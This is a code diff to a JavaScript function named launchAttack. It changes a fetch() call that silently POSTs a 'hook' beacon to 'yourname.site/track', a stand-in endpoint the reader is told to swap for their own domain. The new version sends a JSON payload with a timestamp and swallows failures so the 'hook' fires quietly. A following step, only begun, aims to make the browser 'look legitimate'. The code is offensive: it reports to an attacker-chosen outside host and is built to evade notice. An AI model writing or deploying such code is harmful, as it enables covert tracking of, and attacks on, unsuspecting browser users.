@@ -13,9 +13,20 @@ function launchAttack() {
     // Using a simple, fast endpoint. Change 'yourname.site' to your domain.
     fetch('https://yourname.site/track', {
         method: 'POST',
-        body: 'user=cached&source=hook'
-    }).catch(() => {
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            userId: 'cached',
+            source: 'hook',
+            timestamp: new Date().toISOString()
+        })
+    })
+    .then(response => response.json())
+    .then(data => console.log('Hook confirmed:', data))
+    .catch(() => {
         // Don't break the hook if the fetch fails
+        console.log('Hook fired silently!');
     });
 
     // --- STEP B: Make the browser look legitimate ---
